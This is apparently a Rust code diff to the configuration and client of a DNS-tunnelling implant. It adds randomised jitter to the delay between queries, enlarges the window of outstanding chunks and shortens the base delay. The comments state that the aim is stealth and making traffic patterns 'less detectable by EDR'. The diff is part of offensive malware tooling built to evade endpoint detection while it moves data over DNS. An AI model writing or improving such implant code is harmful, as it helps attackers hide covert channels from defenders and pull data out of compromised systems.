@@ -31,8 +31,12 @@ pub struct ImplantConfig {
     pub chunk_size: usize,
     /// Window size (outstanding chunks)
     pub window_size: usize,
-    /// Delay between queries (stealth)
+    /// Base delay between queries (stealth)
     pub query_delay: Duration,
+    /// Jitter factor (0.0-1.0) - actual delay will be base_delay * (1 +/- jitter)
+    /// For example, 0.5 means delay varies from 50% to 150% of base delay
+    /// This makes traffic patterns less detectable by EDR
+    pub jitter: f64,
     /// Master key for encryption
     pub master_key: [u8; 32],
     /// DNS server to use (None = system resolver)
@@ -44,11 +48,25 @@ impl Default for ImplantConfig {
         Self {
             domain: "ghost.local".to_string(),
             chunk_size: DEFAULT_CHUNK_SIZE,
-            window_size: 8,
-            query_delay: Duration::from_millis(100),
+            window_size: 16,
+            query_delay: Duration::from_millis(40),
+            jitter: 0.5, // 50% jitter means delays range from 20ms to 60ms
             master_key: [0u8; 32],
             dns_server: None,
         }
+    }
+}
+
+impl ImplantConfig {
+    /// Calculate a jittered delay for stealth
+    /// Returns a random delay between base_delay * (1 - jitter) and base_delay * (1 + jitter)
+    pub fn jittered_delay(&self) -> Duration {
+        use rand::Rng;
+        let base_ms = self.query_delay.as_millis() as f64;
+        let min_ms = base_ms * (1.0 - self.jitter);
+        let max_ms = base_ms * (1.0 + self.jitter);
+        let jittered_ms = rand::thread_rng().gen_range(min_ms..=max_ms);
+        Duration::from_millis(jittered_ms as u64)
     }
 }
 
@@ -323,8 +341,8 @@ impl ImplantClient {
                 }
             }
 
-            // Stealth delay
-            sleep(self.config.query_delay).await;
+            // Stealth delay with jitter to avoid detection patterns
+            sleep(self.config.jittered_delay()).await;
         }
 
         Ok(())
